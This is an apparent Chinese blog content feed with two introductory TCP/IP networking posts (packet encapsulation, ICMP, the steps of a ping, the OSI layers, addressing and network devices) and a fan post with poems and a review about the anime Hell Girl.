<h4 id="发送处理"><a href="#发送处理" class="headerlink" title="发送处理"></a>发送处理</h4><ul>
<li>应用程序处理</li>
</ul>
<p>在点击发送邮件之后，应用程序首先会进行编码的处理，比如日文邮件用ISO-2022-JP或者UTF-8进行编码。编码转换后，邮件不会立即被发出去，因为有的软件有一次行发送多个邮件的功能。像这种何时建立通信连接发送数据的功能，属于会话层。</p>
<p>应用在发送邮件的那一刻建立TCP连接，目的是为了利用这个TCP连接发送数据。它的过程是首先将应用数据发送给下一层的TCP，再做实际的转发处理。</p>
<ul>
<li>TCP模块处理</li>
</ul>
<p>TCP会在应用层数据的首端附加一个TCP首部。TCP首部中包括源端口号和目标端口号、序号（标识该数据包是整个数据中的第几字节）以及校验和（判断数据是否被损坏）。随后将附加了TCP首部的包发送给IP。</p>
<ul>
<li>IP模块的处理</li>
</ul>
<p>IP将TCP传过来的TCP首部和TCP数据合起来当作自己的数据，并在TCP首部的前端加上自己的IP首部，IP首部中包含了接收端、发送端的IP地址。紧接着IP首部还有判断后面是TCP还是UDP的信息。</p>
<p>IP包生成后，参考路由控制表决定接受此IP包的路由器或者主机，随后IP包将会被发送给连接这些路由器或者主机的网络接口的驱动程序。</p>
<p>如果不知道接收端的MAC地址，可以利用ARP查找，然后将MAC地址和IP地址交给以太网驱动程序，实现数据传输。</p>
<ul>
<li>网络接口（以太网驱动处理）</li>
</ul>
<p>从IP传过来的IP包，以太网驱动给这数据附加上以太网首部并进行发送处理。以太网首部中包含接收端、发送端MAC地址以及标志以太网类型的以太网数据的协议。根据上述信息系产生的以太网数据包通过物理层发送给接收端，发送处理中的FCS由硬件计算，也是一种校验机制，添加到包的末尾。</p>
<p>下面用一张分层中包的结构来表示：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/137E996B0D74B3ACEE5CCA95D40F9F97.png" alt="137E996B0D74B3ACEE5CCA95D40F9F97.png" title="" class="">
                <p>137E996B0D74B3ACEE5CCA95D40F9F97.png</p>
            </figure>
<p>每个包首部都至少包括两个信息：一个是发送端和接收端地址，另一个是上一层协议的类型。</p>
<p>其中发送端和接收端的地址在不同层上用不同的标识：</p>
<p>以太网用MAC地址，IP用IP地址，TCP/UDP用端口号，在应用程序中，比如SMTP用电子邮件地址</p>
<p>此外，每个分层的包首部还包含一个标识位，用来标识上一层协议的种类信息。</p>
<h4 id="接受处理"><a href="#接受处理" class="headerlink" title="接受处理"></a>接受处理</h4><ul>
<li>网络接口</li>
</ul>
<p>主机收到数据包之后，首先从以太网包首部找到MAC地址判断是否位发送自己的，否则丢掉。</p>
<p>然后再从首部的类型域中判断以太网协议传输过来的数据类型，IP包就将数据传给处理IP的子程序，如果是诸如ARP之类的，就将数据给对应的处理。如果包含了一个无法识别的协议类型，也会丢弃数据包。</p>
<ul>
<li>IP模块的处理</li>
</ul>
<p>和前面做类似的处理，如果IP地址匹配，就接受数据并查找上一层协议，如TCP／UDP等，并将数据传递过去处理。对于有路由器的情况下，接受端往往不是自己的地址，需要借助路由控制表，在调查应该送达的主机或者路由器的时候再转发数据</p>
<ul>
<li>TCP模块的处理</li>
</ul>
<p>首先计算一下校验和，判断数据是否损坏，再检查是否是按序号发送数据包，最后检查端口号，确定具体程序。数据接收完毕后，会发送一个”确认回执”给发送端。如果这个回执信息没有到达发送端，那么发送端会认为接收端没有收到数据而一直反复发送。</p>
<p>数据被接受后，会传给由端口号识别的应用程序</p>
<ul>
<li>应用程序的处理</li>
</ul>
<p>接收端应用程序会直接接受发送端发送的数据，通过解析数据找到乙的地址，如果接收端主机上没有乙的邮件信箱，那么就会返回发送端一个”无收件地址的报错信息”，如果有邮件未能保存或邮箱已满等问题也会返回异常给发送端，没有异常的话用户乙就可以喝完一杯清晨的咖啡后，舒适的阅读来自甲的邮件了～</p>
<h3 id="主机的通信"><a href="#主机的通信" class="headerlink" title="主机的通信"></a>主机的通信</h3><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>首先说一下ping，这是操作系统中的一个小程序，可以用来检测两台主机的连通性，如果ping的通，表示网络可达，ping不同，证明需要排错:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-31%20%E4%B8%8A%E5%8D%8810.09.00.png" alt="屏幕快照 2017-08-31 上午10.09.00.png" title="" class="">
                <p>屏幕快照 2017-08-31 上午10.09.00.png</p>
            </figure>
<p>那么这个icmp报文是如何生成的呢？那么首先还要来说一下icmp</p>
<h4 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h4><p>icmp是一个网络控制协议，当网络发生一些或大或小的问题，通过该协议可以告知通信的发起方，比如，当一个IP包太大，比如1500字节，到达一个路由器的接口，接口最大传输单元MTU=1476字节，由于IP包1500&gt;MTU1476，这个IP包必须分成两片才可以从接口发送出去，问题来了，如果IP包里有一个标志位DF=1，意思就是说这个IP包不能进行分片，要么丢弃要么接受，那路由器只有无奈地丢弃这个IP包，如果没有消息告知这个IP发起者，会发生什么？IP包都被默默丢弃了，而IP包发起方并不知道，还以为数据已经到达了目的地，其实都被丢了，这就是流量黑洞，所以需要一种消息机制告知IP包的发起者，这个消息就是用ICMP来发送的，那发送什么样的消息呢？</p>
<p>ICMP协议里有type字段，还有code字段，发送type=3，code=4，MTU=1476的消息就可以了，当这个ICMP消息到达IP包的发起者，发起者知道原来是IP太大了，那最大可以发送多大的呢？消息里有，那就MTU=1476，于是IP包的发起方只要发送小于等于1476字节的就可以了。</p>
<h4 id="发送过程"><a href="#发送过程" class="headerlink" title="发送过程"></a>发送过程</h4><p>在键盘上输入ping baidu.com这个命令之后，发生了什么事情呢：</p>
<p>1、主机查找本地系统Hosts文件的DNS缓存，如果存在该域名对应的IP，则获取IP，跳转到第8步；如果不存在，则继续。</p>
<p>2、主机向本网络路由器发起请求，查找路由DNS缓存，如果存在该域名对于的IP，则获取IP，跳转到第8步；如果不存在，则继续。</p>
<p>3、路由器向本地ISP（互联网提供商）的DNS服务器发起请求，查找DNS服务器的缓存，如果存在该域名对应的IP，则跳转到第7步；如果不存在，则继续。</p>
<p>4、本地DNS服务器向根域名服务器发起请求，根域名服务器告诉本地服务器，下一次应查询的顶级域名服务器dns.com的IP地址。</p>
<p>5、本地域名服务器向顶级域名服务器dns.com进行查询，顶级域名服务器dns.com告诉本地域名服务器，下一步应查询的权限服务器dns.abc.com的IP地址。</p>
<p>6、本地域名服务器向权限域名服务器dns.abc.com进行查询，权限域名服务器dns.abc.com告诉本地域名服务器，所查询的主机的IP地址。 </p>
<p>7、本地域名服务器最后把查询结果——该域名对应的IP地址告诉给主机。</p>
<p>8、至此，主机知道了该域名的IP地址。</p>
<p>9、主机通过子网掩码判断该IP地址是本网段还是跨网段，由于本网段比较简单，我们以跨网段进行讲解。</p>
<p>10、主机先查看本地ARP高速缓存，查看表中是否有本网络路由器（网关）的MAC地址，如果有，则获取MAC地址，跳转到第12步；如果没有，则继续。</p>
<p>11、主机使用ARP解析协议获取到本网段路由的MAC地址。</p>
<p>12、至此，主机知道本网络一个路由的MAC地址。</p>
<p>13、主机将ICMP报文封装成IP数据报，IP数据报的源地址为主机的IP地址，目的地址是域名对应的IP地址</p>
<p>14、主机将IP数据报封装成MAC帧，MAC帧的源地址为主机的MAC地址，目的地址是路由器的MAC地址</p>
<p>15、路由器接收到ICMP报文之后，发现MAC帧的目的地址是自己，IP地址是主机想要访问的IP地址，则将MAC帧的源地址改为自己的MAC地址，目的地址改为本网段另一个路由的MAC地址（也要通过ARP协议获取），转发下去…</p>
<p>16、直到最后一个路由根据ARP协议，找到了主机想要访问的IP地址对应的主机的MAC地址，然后将ICMP报文封装成MAC帧发送给该域名主机。</p>
<p>17、由于ARP协议具有相互学习性，域名主机接收到主机发送的ICMP回送请求报文之后，将向本网络路由发送ICMP回送回答报文，该路由又会转发下去…</p>
<p>18、当主机收到域名主机发送的ICMP回送回答报文之后，这样就表明该主机到域名主机是连通可达的。</p>
<h3 id="SNS通信（补充）"><a href="#SNS通信（补充）" class="headerlink" title="SNS通信（补充）"></a>SNS通信（补充）</h3><p>SNS的中文叫做社交网络，是一种即使共享，发布消息给圈内特定联系人的一种服务，现在就来分析一下移动端发送或者接受SNS消息的过程：</p>
<p>平板电脑、手机等进行分组数据的通信，在打开手机的那一刻，就会被通信运营商设定具体的IP地址。</p>
<p>启动移动电话中的应用程序，会连接指定的服务器，通过一系列的验证，返回指定的信息，由手机终端显示具体内容。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/39ECBBCFAB9F236DE0E6B1792CC26AA3.png" alt="39ECBBCFAB9F236DE0E6B1792CC26AA3.png" title="" class="">
                <p>39ECBBCFAB9F236DE0E6B1792CC26AA3.png</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 消息发送流程 数据包头部信息 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> TCP/IP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[地獄少女]]></title>
      <url>/2017/08/24/%E5%9C%B0%E7%8B%B1%E5%B0%91%E5%A5%B3/</url>
      <content type="html"><![CDATA[<h2 id="人世有情，相连的红线不停的缠绕，脆落又惹人怜的彼岸花。愤怒、悲伤、终日以泪洗面，在子夜零晨的夜幕后，为你消除无法平息的怨恨。"><a href="#人世有情，相连的红线不停的缠绕，脆落又惹人怜的彼岸花。愤怒、悲伤、终日以泪洗面，在子夜零晨的夜幕后，为你消除无法平息的怨恨。" class="headerlink" title="人世有情，相连的红线不停的缠绕，脆落又惹人怜的彼岸花。愤怒、悲伤、终日以泪洗面，在子夜零晨的夜幕后，为你消除无法平息的怨恨。"></a>人世有情，相连的红线不停的缠绕，脆落又惹人怜的彼岸花。愤怒、悲伤、终日以泪洗面，在子夜零晨的夜幕后，为你消除无法平息的怨恨。</h2><a id="more"></a>
<div style="text-align: center;"><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E7%88%B11.jpeg" alt="爱1.jpeg" title="" class="">
                <p>爱1.jpeg</p>
            </figure><br>    心 浸 蛊 海 孽 缘 深<br><br>    难 分 阴 阳 并 假 真<br><br>    似 有 声 在 冥 冥 中<br><br>    时 隐 时 现 难 辨 分<br><br>    尽 理 世 间 难 雪 恨<br></div>

<p><br></p>
<h2 id="飘飘荡荡的幻影，背负著可悲的宿命，在迷途中徘徊。无解的恨与被恨，在破碎的镜子结合之时，从时空交错的黑暗而来，为你洗刷无法昭雪的怨恨。"><a href="#飘飘荡荡的幻影，背负著可悲的宿命，在迷途中徘徊。无解的恨与被恨，在破碎的镜子结合之时，从时空交错的黑暗而来，为你洗刷无法昭雪的怨恨。" class="headerlink" title="飘飘荡荡的幻影，背负著可悲的宿命，在迷途中徘徊。无解的恨与被恨，在破碎的镜子结合之时，从时空交错的黑暗而来，为你洗刷无法昭雪的怨恨。"></a>飘飘荡荡的幻影，背负著可悲的宿命，在迷途中徘徊。无解的恨与被恨，在破碎的镜子结合之时，从时空交错的黑暗而来，为你洗刷无法昭雪的怨恨。</h2><div style="text-align: center;"><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/d8b42883b615f0d0654eb71b747b0693.jpg" alt="d8b42883b615f0d0654eb71b747b0693.jpg" title="" class="">
                <p>d8b42883b615f0d0654eb71b747b0693.jpg</p>
            </figure><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/2ec2fefbe9f677b719042811e7aead8c.jpg" alt="2ec2fefbe9f677b719042811e7aead8c.jpg" title="" class="">
                <p>2ec2fefbe9f677b719042811e7aead8c.jpg</p>
            </figure><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/1aabc5a0efab51e758085876ba7f317e.jpg" alt="1aabc5a0efab51e758085876ba7f317e.jpg" title="" class="">
                <p>1aabc5a0efab51e758085876ba7f317e.jpg</p>
            </figure><br></div>


<p>樱花何时盛开<br>何时在山村里盛开</p>
<p>樱花何时飘香<br>正值欢笑七童玩耍时</p>
<p>樱花何时飞舞<br>正值欢笑七童入睡时</p>
<p>樱花何时凋谢<br>正值七童亡魂升天时<br>……</p>
<p>有一个叫做“背叛”的字眼深深的刻在心里。<br>那重重的砸在脸上的石块，<br>眼睛里流出的绯红色液体。</p>
<p>“不可原谅……<br>不是说了要保护我的吗？”</p>
<p>渐渐消失的光明，<br>遗弃了自己的世界。</p>
<p>“诅咒你们，死也要诅咒你们！”</p>
<p>“消失吧，你这个妖怪……<br>　村子里怎么会有你这个妖怪……<br>　这样的祸害不如供给山神，还能为大家做点好事……”</p>
<p>你们都是这样想的吧……</p>
<p>只有仙太郎：“爱就是爱而已……”<br>只有仙太郎，自己的世界只剩下仙太郎……</p>
<p>为什么姓了閻魔？</p>
<p>“那只蝴蝶没有死，我只是让它再飞起来而已。”</p>
<p>明明自己什么都没做……<br>明明已经藏了起来……</p>
<p>只是仙太郎，<br>只有仙太郎，<br>不能原谅。<br>当你举起铲子向掩埋的洞穴抛下第一铲土的时候，爱明白自己什么都不再拥有了。</p>
<p>“鷍，<br>　你恨阿一吧，夺去你母亲的父亲。悲伤吧，寂寞吧……<br>　那么收下人偶吧，取下红线，我们就正式签订了契约。我会帮你把他送下地狱。”</p>
<p>这怨恨，过了四百年，依然占据爱的心。</p>
<p>“鷍，你们都下地狱吧，流着仙太郎血的人。”</p>
<p>“人真是可悲的生物，被怨恨这种东西占据心灵，连小姐也不例外。”<br>三叶只能默默地看着你－－爱。</p>
<p>可，爱，你知道么，七童寺的樱花只为你一个人开放，仙太郎的黑糖也只为你一个人做。<br>那么怨恨，是因为喜欢吧，因为喜欢。</p>
<p>那么燃烧的七童寺，是原谅，还是了断？<br>鷍，你一定知道。</p>
<p></p>
<p><br></p>
<h2 id="三者，三岔路也，分离之路。愿守护之路，是己是人，抑或是常世之梦。衣皱纷乱即三鼎，阿鼻之宴永不散席。撕裂时间，敞开门扉，无法消失的怨恨，便将雪除。"><a href="#三者，三岔路也，分离之路。愿守护之路，是己是人，抑或是常世之梦。衣皱纷乱即三鼎，阿鼻之宴永不散席。撕裂时间，敞开门扉，无法消失的怨恨，便将雪除。" class="headerlink" title="三者，三岔路也，分离之路。愿守护之路，是己是人，抑或是常世之梦。衣皱纷乱即三鼎，阿鼻之宴永不散席。撕裂时间，敞开门扉，无法消失的怨恨，便将雪除。"></a>三者，三岔路也，分离之路。愿守护之路，是己是人，抑或是常世之梦。衣皱纷乱即三鼎，阿鼻之宴永不散席。撕裂时间，敞开门扉，无法消失的怨恨，便将雪除。</h2><div style="text-align: center;"><br><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/49ffc60f8dfb218d2676fbe2ced5f852.jpg" alt="49ffc60f8dfb218d2676fbe2ced5f852.jpg" title="" class="">
                <p>49ffc60f8dfb218d2676fbe2ced5f852.jpg</p>
            </figure><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/7ae5ed1228a60ab9a0c7d5dab4c8ff17.jpg" alt="7ae5ed1228a60ab9a0c7d5dab4c8ff17.jpg" title="" class="">
                <p>7ae5ed1228a60ab9a0c7d5dab4c8ff17.jpg</p>
            </figure><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/659fe3724554e820ae94d8e2f8e1f878.jpg" alt="659fe3724554e820ae94d8e2f8e1f878.jpg" title="" class="">
                <p>659fe3724554e820ae94d8e2f8e1f878.jpg</p>
            </figure><br></div>

<p><br><br>此怨此恨，流向地狱—-地狱，是不是安乐的场所呢？<br><br>如果知己很痛苦，如果知己希望下地狱，是不是应该帮他达成心愿呢？即使知道，自己也会下地狱？<br>如果知道，自己死后就会下地狱，该游戏人生，还是应该认真地活好每一天，还是让自己得到更多的陪伴？<br>在怎样的痛不欲生，无力回天的情况下，才会想到让一个人消失在和自己同一个世界上，履行害人终害己的诺言？<br>到底是别人伤自己痛，还是看到自己在意的人痛苦更痛？<br><br>人和人的关系到底是怎样的呢？每一个人，都是被亲情、爱情、友情、怨怒、仇恨缠绕的个体，终其一生为身上的这些绳索而努力，被它们勒得喘不过气来，为它们举起匕首投向远方。作茧自缚，却感到寂寞…<br><br>有人用弗洛伊德的理论进行解释。超我让人们为别人而活，本我让人们快乐，而自我在中间费力地保持平衡。原来，我只是一个很本我的人，不是自我，谈不上超我。又原来我的伤心、无奈、痛苦只是希望自己快乐，就像酒好喝就是因为它难喝，奇怪的辩证法。<br><br>那划着地狱的小船，寂寞的眼神，清冷的嗓音，在一开始重复着“残忍伤害别人的人，要不要死一次“的瞳，却发出一声淡淡的叹息，说到，”地狱，不是安乐逃避的场所。”婆婆笑道，每个人有每个人的想法和做法，你就别太在意了。“终于发现，最最伤痛的人，往往是最冷漠的，因为这个时候，痛到忘记了。<br><br>也许，为了身上的绳索不惜让自己下地狱，让伤害自己深爱的人的人消失在这个世界上，才能证明自己真正爱一个人吧。讽刺的是，一般这样以后，往往会出现另一个人来爱自己，抚平自己的伤痕。但是，我却连报仇的勇气都没有，真是尴尬。看来，我最爱的还是自己，而安慰自己的话，却是借那个人的名义来说，他希望我快乐幸福。<br><br>人是个被语言左右的动物，因为只有人才有语言，所以人被语言束缚。人们因为一句话而动杀机，也因为一句话而将化解仇恨，因为一句话绝望，也因为一句话兴奋。区别只在于，是否听到了希望别人说出的话。所以，祸从口出，金玉良言。<br><br>当善良的人知道自己要下地狱了之后，可能只会淡然的活着吧，因为占有没有意义，失去也价值不大。轻轻的一笑，慢慢的走去。真正释然了之后，只会发出笑容吧，如花满楼。但是，烙印可能永远无法忘记。<br><br></p>



<h3 id="注：影评源自豆瓣"><a href="#注：影评源自豆瓣" class="headerlink" title="注：影评源自豆瓣"></a>注：影评源自豆瓣</h3><div style="text-align: center;"><br><br><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="0" height="0" src="//music.163.com/outchain/player?type=2&id=532936&auto=1&height=66"></iframe><br><br></div>





<h2 id="地獄コミュニケーションズ"><a href="#地獄コミュニケーションズ" class="headerlink" title="地獄コミュニケーションズ"></a><a href="http://jigoku.ouliu.net/" target="_blank" rel="external">地獄コミュニケーションズ</a></h2>]]></content>
      
        <categories>
            
            <category> 阎魔爱 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP(一)]]></title>
      <url>/2017/08/24/TCP:IP-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>日常的生活中，我们无时不刻都在进行着互联网上的数据交互，那么数据如何进行传输的呢？<br><a id="more"></a></p>
<h1 id="TCP-IP-一"><a href="#TCP-IP-一" class="headerlink" title="TCP/IP(一)"></a>TCP/IP(一)</h1><p>Unix只针对大型主机或服务器，而Linux适用于x86的个人计算机</p>
<p>Linux的内核是运行程序和管理像磁盘和打印机等硬件设备的核心程序，它提供了一个在裸设备和应用程序之间的抽象层,简单来说如同心脏之于人，发动机之于汽车，CPU之于计算机，最后附上一个内核源码的<a href="https://www.kernel.org/" target="_blank" rel="external">下载地址</a>。</p>
<p>Linux在服务器领域的应用是其重要分支，其免费，稳定，高效等特点得到了很好的体验。</p>
<h2 id="TCP-IP的意义"><a href="#TCP-IP的意义" class="headerlink" title="TCP/IP的意义"></a>TCP/IP的意义</h2><p>不同硬件，操作系统之间的通信都需要一种规则，我们把这种规则称作协议，而其中的TCP/IP协议则是互联网相关的各类协议族的总称。</p>
<h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/osi1-5.png" alt="osi1-5.png" title="" class="">
                <p>osi1-5.png</p>
            </figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/osi4-1.png" alt="osi4-1.png" title="" class="">
                <p>osi4-1.png</p>
            </figure>
<p>因为计算机不像人一样拥有随机应变的能力，所以我们需要应对各种异常情况并进行处理，其中OSI模型对通信中的必要功能进行了很好的归纳，但是由于没有对协议和接口进行详细的定义，对于学习协议只能起一个引导作用。</p>
<h2 id="OSI参考模型通信处理举例"><a href="#OSI参考模型通信处理举例" class="headerlink" title="OSI参考模型通信处理举例"></a>OSI参考模型通信处理举例</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/osi%E6%A8%A1%E5%9E%8B%E5%8F%82%E8%80%83%E4%B8%BE%E4%BE%8B.png" alt="osi模型参考举例.png" title="" class="">
                <p>osi模型参考举例.png</p>
            </figure>
<p>为了方便理解，我们举一个例子，如上图所示，A向B发一个邮件问好：</p>
<ul>
<li>应用层</li>
</ul>
<p>用户输入完点击发送的时候，就进入了应用层协议的处理，通过电子邮件协议，该协议会在传输数据的首部附加一个信息，标明邮件的内容和收件人。当收件人B收到数据后会进行相应的处理，如果邮箱已满则会返回异常，这类异常是应用层需要处理的问题。</p>
<ul>
<li>表示层</li>
</ul>
<p>所使用的应用软件的不同都会导致数据的表现形式截然不同，为了顺利的收发邮件，要将数据通过某个计算机的格式转换成网络通用格式，目标方收到后再转换成该主机特有的数据格式，表示层之间为了识别编码格式也会附加首部信息</p>
<ul>
<li>会话层</li>
</ul>
<p>决定了两个主机之间如何进行高效的数据交互，A要同时发五个邮件给B，可以建立一次连接发一次，也可以建立好之后一次性发过去，也可以建立五个连接同时发过去，采用什么连接方式是会话层的主要责任，同时头部也会附上数据的传输顺序的信息。</p>
<ul>
<li>传输层</li>
</ul>
<p>如果说会话层是负责建立什么样的连接，那么传输层就是建立连接和断开连接，在两个主机之间创建逻辑的通信连接，为了确保数据到达目标地址，会在通信两端的计算机进行确认，如果数据没有送达，它会负责重发。</p>
<p>比如某种原因，B只收到”早上”，没有收到”好”,然后就会把这个数据返回给A，A的之后再把”好”发送过去，并再次确认是否收到。就好比我们日常生活中有人问<code>你刚才说什么？</code></p>
<ul>
<li>网络层</li>
</ul>
<p>网络层负责将数据发送至最终目标地址，虽然两端主机之间有众多的数据链路，但是这是下一层数据链路层的事情，网络层会将其从上层收到的数据和地址信息发送给下面的数据链路层。简单的说就是网络层负责的是端对端的通信。</p>
<ul>
<li>数据链路层</li>
</ul>
<p>数据链路层的作用是在通过传输介质互联的设备之间进行数据处理，和上层的关系可以用一张图来表示：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/697D6930A9BFC709E63475EDB8C2AB4E.png" alt="697D6930A9BFC709E63475EDB8C2AB4E.png" title="" class="">
                <p>697D6930A9BFC709E63475EDB8C2AB4E.png</p>
            </figure>
<p>相互连接的设备之间使用地址实现传输。这种地址被称为MAC地址。</p>
<ul>
<li>物理层</li>
</ul>
<p>将数据的0、1转换为电压和脉冲光传输给物理的传输介质，传输到别的设备然后再通过自下而上的方式对信息解析。</p>
<h2 id="传输方式的分类"><a href="#传输方式的分类" class="headerlink" title="传输方式的分类"></a>传输方式的分类</h2><h3 id="面向有连接型和面向无连接型"><a href="#面向有连接型和面向无连接型" class="headerlink" title="面向有连接型和面向无连接型"></a>面向有连接型和面向无连接型</h3><ul>
<li>面向有连接型</li>
</ul>
<p>在发送数据之前，要在收发主机之间连接一条通信线路。就好像给别人打电话需要对方接通后才能进行通话。需要在通信传输的前后，专门进行建立和断开连接的处理，如果对端无法通信，可以避免发送无谓的数据。</p>
<ul>
<li>面向无连接型</li>
</ul>
<p>不要求建立和断开连接。发送端可以在任何时候对接收端发送数据，在这种情况下，是接收方需要时常确认是否受到数据。就像人们去邮局寄包裹的时候，不需要管收件人的地址是否存在，只需要写上这个地址即可以办理邮寄包裹的业务。</p>
<h3 id="电路交换和分组交换"><a href="#电路交换和分组交换" class="headerlink" title="电路交换和分组交换"></a>电路交换和分组交换</h3><p>目前网络通信方式大致分为两种—电路交换和分组交换.电路交换技术相对来说比较久远，主要用于过去的电话网。而分组交换技术从上世纪60年代才逐渐被人们所认可，TCP/IP也正是采用了分组交换技术。</p>
<ul>
<li>电路交换</li>
</ul>
<p>某条电路只是用来连接两台计算机的通信线路，就意味着一台计算机在收发信息的时候会独占整个电路，其他的计算机只能等这台计算机使用结束之后才有机会使用这个电路收发数据，但是谁都无法预测什么时候通信开始和结束，所以如果并发用户超过交换机之间的通信线路数，就意味着通信根本无法实现。</p>
<ul>
<li>分组交换</li>
</ul>
<p>聪明的人类想到了一个方法来解决这个问题～：将连接到通信电路的计算机所要发送的数据分成多个数据包，按照一定的顺序排列之后再发送，因为在包的首部写入发送端和接收端的地址，所以可以唯一确认。</p>
<p>发送端计算机将数据分组发送给路由器，路由器接收到数据以后会按照顺序缓存到相应的队列中，再以先进先出的原则发送出去。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/22E392D96C18B8E857BDC0D431FCC14C.png" alt="22E392D96C18B8E857BDC0D431FCC14C.png" title="" class="">
                <p>22E392D96C18B8E857BDC0D431FCC14C.png</p>
            </figure>
<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><h3 id="地址的唯一性"><a href="#地址的唯一性" class="headerlink" title="地址的唯一性"></a>地址的唯一性</h3><p>如果要让地址在通信中发挥作用，通信的主体也就是是信息收发端必须是唯一的表示一个对象。同一个</p>
<p>通信网络中不能有两个地址相同的通信主体存在,这也就是地址的唯一性。</p>
<p>这里可能会有一个疑问，对于单播还比较好理解，在多播、广播中是怎么保证地址的唯一行的呢？</p>
<p>在这种接收端设备不止一个的情况下，可以对这些由多个设备组成的一组通信赋予同一个具有唯一特性的地址：</p>
<p>那么我们可以举几个例子来说明以下几种情况，如果说单播是校长找小茗同学谈话：</p>
<ul>
<li>多播</li>
</ul>
<p>某位老师说：三年级五班的同学到操场集合。那么三年五班就是这次多播的目标地址，具有唯一性</p>
<ul>
<li>广播</li>
</ul>
<p>同样的，校长说，我校师生起立，那么全校就是广播的目标地址，也具有唯一性</p>
<ul>
<li>任播</li>
</ul>
<p>在领取教材的时候，主任说七班任意来一位同学拿名册，任意一位同学就是这次任播的目标地址</p>
<h3 id="地址的层次性"><a href="#地址的层次性" class="headerlink" title="地址的层次性"></a>地址的层次性</h3><p>当地址不是很多的时候，有唯一地址就可以确定通信主体，但是在当今庞大的互联网中，地址除了具有唯一性还需要具有层次性。其实在电话号码中就已经有这种设定了，电话号码包括国家区号和国内区号，这样就可以更加快速的定位；</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/8728D70860794E71410D42FE4A2709F4.png" alt="8728D70860794E71410D42FE4A2709F4.png" title="" class="">
                <p>8728D70860794E71410D42FE4A2709F4.png</p>
            </figure>
<p>MAC地址和IP地址在标识一个通信主体时虽然都具有唯一性，但只有IP地址具有层次性。</p>
<p>MAC地址由设备的制造厂商对每块网卡进行分别的指定，而IP地址通过网络号和主机号两部分组成。主机号不同，网络号相同，说明他们处于同一个网段。另一方面，网络号相同的主机在提供商类型，地域分布上都比较集中。这也是为什么说IP地址具有层次性。</p>
<p>网络传输中，每个节点会根据分组数据的地址信息，来判断报文应该从哪个网卡发出去。为此，各个地址都会参考一个发出接口列表。这一点上MAC寻址和IP寻址是一样的。只不过MAC寻址所参考的这个表叫做地址转发表，而IP寻址中所参考的叫做路由控制表。一个记录的是实际的MAC地址，一个是集中后的网络号。比如下面这个例子：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/280123794EEFF716EF4A094084DE7FB5.png" alt="280123794EEFF716EF4A094084DE7FB5.png" title="" class="">
                <p>280123794EEFF716EF4A094084DE7FB5.png</p>
            </figure>
<h2 id="网络的构成要素"><a href="#网络的构成要素" class="headerlink" title="网络的构成要素"></a>网络的构成要素</h2><table>
<thead>
<tr>
<th style="text-align:center">设备</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">网卡（NIC）</td>
<td style="text-align:center">是计算机联网的设备</td>
</tr>
<tr>
<td style="text-align:center">中继器</td>
<td style="text-align:center">从物理层上延长网络的设备</td>
</tr>
<tr>
<td style="text-align:center">网桥/2层交换机</td>
<td style="text-align:center">从数据链路层上延长网络的设备</td>
</tr>
<tr>
<td style="text-align:center">路由器/3层交换机</td>
<td style="text-align:center">通过网络层转发分组数据的设备</td>
</tr>
<tr>
<td style="text-align:center">4~7层交换机</td>
<td style="text-align:center">处理传输层以上各层网络传输的设备</td>
</tr>
<tr>
<td style="text-align:center">网关</td>
<td style="text-align:center">转换协议的设备</td>
</tr>
</tbody>
</table>
<p>这里中继器和交换机方面的知识之前已经提过，就不多赘述，那么来说说网关吧</p>
<p>网关是负责将OSI模型中从传输层到应用层的数据进行转换和转发的设备。它和4～7层交换机一样都是处理传输层以上的数据，网关不仅转发数据还会对数据进行转换，它通常会使用一个表示层或者应用层网关，在两个不能直接进行通信的协议之间进行翻译，最终实现两者之间的通信。</p>
<p>就好比说手机的邮件有时会和互联网的邮件不兼容，这是由于它们在表示层和应用层之间的电子应用协议互不相同所导致。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/33D1998EBE60340EE0E2CB4067AC6F57.png" alt="33D1998EBE60340EE0E2CB4067AC6F57.png" title="" class="">
                <p>33D1998EBE60340EE0E2CB4067AC6F57.png</p>
            </figure>
<p>其中代理服务器也算是网关，被称作应用网关，在我大天朝也是应用广泛，应用方面自行体会～</p>
<h3 id="互联网通信"><a href="#互联网通信" class="headerlink" title="互联网通信"></a>互联网通信</h3><p>人们在家或公司一般都会使用互联网接入服务，汇集到无限局域网路由器和最近交换机的通信会被连接到所谓的”接入层”，甚至通过边缘网络或主干网实现与目标地址进行通信。</p>
<p>如果是移动通信，手机一开机，就会自动和距离最近的基站发生无线通信。基站设有特定的手机基站天线，本身相当于网络的接入层。</p>
